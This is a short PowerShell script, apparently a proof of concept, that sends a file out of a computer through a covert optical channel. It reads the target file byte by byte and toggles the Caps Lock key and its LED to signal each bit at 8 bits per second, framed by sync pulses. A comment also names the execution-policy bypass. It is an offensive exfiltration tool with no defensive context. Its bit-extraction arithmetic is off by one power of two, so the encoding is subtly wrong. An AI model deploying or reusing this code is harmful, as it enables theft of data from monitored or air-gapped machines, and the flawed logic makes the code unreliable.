# Set-ExecutionPolicy -Scope Process Bypass

Import-Module -Force ./caps.psm1

# param([int]$Freq=16) 

$Freq = 8 # bps

function Chirp(){
        Start-Sleep -Milliseconds (1000/$Freq -as [int])
}

function Send-Bit(){
    
    param(
        [Parameter(Mandatory, Position=0)]
        [bool]$state
    )

    Set-CapsLock $state
    Chirp
}

function Sync(){
    Set-CapsLock $FALSE
    for($i = 0; $i -lt 8; $i++){
        Set-CapsLock $TRUE
        Chirp
        Set-CapsLock $FALSE
        Chirp
    }
}

function Exfiltrate-File(){
    
    param(
        [Parameter(Mandatory, Position=0)]
        [string]$file_path
    )

    $file_content = Get-Content -Encoding byte -Path $file_path

    Sync

    $len = $file_content.Length
    for($i = 0; $i -lt $len; $i++){
        
        $perc = [math]::Truncate((($i+1)/$len)*10000)/100
        Write-Host "$perc%"

        [byte]$c = $file_content.Get($i)

        for($j = 0; $j -lt 8; $j++){
            [byte]$b = [math]::Floor($c / ([math]::Pow(2, 8 - $j)))
            [bool]$state = ($b % 2) -eq 1
            Send-Bit $state
        }
    }

    Sync
}
